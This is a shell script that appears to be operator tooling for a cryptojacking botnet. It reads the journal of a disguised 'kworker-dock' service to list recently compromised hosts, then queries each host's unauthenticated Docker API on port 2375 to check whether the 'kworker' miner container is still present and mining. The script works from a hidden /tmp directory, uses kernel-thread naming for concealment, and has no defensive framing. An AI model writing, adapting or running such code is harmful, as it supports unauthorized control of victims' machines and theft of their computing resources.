#!/bin/sh
# throwaway: of the hosts we deployed in the last 45 minutes, how many STILL have a
# container and are mining?  Deployed != held != mining; this walks journal -> IPs and
# probes each one live, so "are we gaining miners" is answered with evidence.
cd /tmp/.sysd || exit 1
ips=$(journalctl -u kworker-dock --since -45min --no-pager 2>/dev/null | grep DEPLOYED | grep -o -e '-> [0-9.]*' | cut -d' ' -f2 | sort -u | head -20)
echo "deployed_45min=$(printf '%s\n' $ips | grep -c .)"
n=0; have=0; mine=0
for ip in $ips; do
    n=$((n + 1))
    v=$(curl -sS -m 4 "http://$ip:2375/version" 2>/dev/null | grep -o '"ApiVersion": *"[0-9.]*"' | head -1 | cut -d'"' -f4) || v=""
    u="http://$ip:2375"
    [ -n "$v" ] && u="$u/v$v"
    l=$(curl -sS -m 5 "$u/containers/json?all=1" 2>/dev/null) || l=""
    if printf '%s' "$l" | grep -q kworker; then
        have=$((have + 1))
        cid=$(printf '%s' "$l" | awk '{ n=split($0,a,"\"Id\":\""); for (i=2;i<=n;i++) if (index(a[i],"kworker")>0) { split(a[i],x,"\""); print x[1]; exit } }')
        lg=$(curl -sS -m 5 "$u/containers/$cid/logs?stdout=1&tail=30" 2>/dev/null | tr -d '\000') || lg=""
        if printf '%s' "$lg" | grep -q -e speed -e job; then
            mine=$((mine + 1)); echo "$ip HELD+MINING"
        else
            echo "$ip held_no_log"
        fi
    else
        echo "$ip GONE"
    fi
done
echo "RESULT probed=$n still_held=$have mining=$mine"
